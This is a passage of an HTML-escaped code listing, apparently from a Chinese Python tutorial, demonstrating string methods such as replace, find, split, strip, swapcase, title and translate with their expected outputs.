trantab &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;maketrans&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;intab&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; outtab&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is string example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;translate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;trantab&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# th3s 3s str3ng 2x1mpl2....w4w!!!&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;最大字符: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 最大字符: u&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;最小字符: &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 最小字符: b&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;www.w3cschool.cc&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;菜鸟教程旧地址：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 菜鸟教程旧地址： www.w3cschool.cc&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;菜鸟教程新地址：&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;replace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;w3cschool.cc&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;runoob.com&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 菜鸟教程新地址： www.runoob.com&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is string example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;replace&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;is&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;was&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# thwas was string example....wow!!!&lt;/span&gt;

str1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is really a string example....wow!!!&#34;&lt;/span&gt;
str2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;is&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rfind&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 5&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rfind&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 5&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rfind&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# -1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;find&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 2&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;find&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 2&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;find&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# -1&lt;/span&gt;

str1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is really a string example....wow!!!&#34;&lt;/span&gt;
str2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;is&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str1&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rindex&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 5&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# print (str1.rindex(str2,10))&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is string example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rjust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# ******************this is string example....wow!!!&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;     this is string example....wow!!!     &#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rstrip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#      this is string example....wow!!!&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;*****this is string example....wow!!!*****&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;rstrip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# *****this is string example....wow!!!&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is string example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 以空格为分隔符&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;this&#39;, &#39;is&#39;, &#39;string&#39;, &#39;example....wow!!!&#39;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;i&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 以 i 为分隔符&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;th&#39;, &#39;s is string example....wow!!!&#39;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;w&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 以 w 为分隔符&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;this is string example....&#39;, &#39;o&#39;, &#39;!!!&#39;]&lt;/span&gt;

txt &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Google#Runoob#Taobao#Facebook&#34;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 第二个参数为 1，返回两个参数列表&lt;/span&gt;
x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; txt&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;split&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;#&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;Google&#39;, &#39;Runoob#Taobao#Facebook&#39;]&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ab c\n\nde fg\rkl\r\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;splitlines&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ab c&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;de fg&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;kl&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ab c\n\nde fg\rkl\r\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;splitlines&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [&#39;ab c\n&#39;, &#39;\n&#39;, &#39;de fg\r&#39;, &#39;kl\r\n&#39;]&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is string example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;startswith&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;this&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 字符串是否以 this 开头&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;startswith&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;string&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 从第九个字符开始的字符串是否以 string 开头&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;startswith&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;this&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 从第2个字符开始到第四个字符结束的字符串是否以 this 开头&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;123abcrunoob321&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;strip&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;12&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 字符序列为 12&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 3abcrunoob3&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is string example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;swapcase&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# THIS IS STRING EXAMPLE....WOW!!!&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;This Is String Example....WOW!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;swapcase&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# tHIS iS sTRING eXAMPLE....wow!!!&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is string example from runoob....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;title&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# This Is String Example From Runoob....Wow!!!&lt;/span&gt;
txt &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;hello b2b2b2 and 3g3g3g&#34;&lt;/span&gt;
x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; txt&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;title&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 非字母后的第一个字母将转换为大写字母&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# Hello B2B2B2 And 3G3G3G&lt;/span&gt;

intab &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;aeiou&#34;&lt;/span&gt;
outtab &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;12345&#34;&lt;/span&gt;
trantab &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;maketrans&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;intab&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; outtab&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 制作翻译表&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is string example....wow!!!&#34;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;translate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;trantab&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# th3s 3s str3ng 2x1mpl2....w4w!!!&lt;/span&gt;

&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this is string example from runoob....wow!!!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
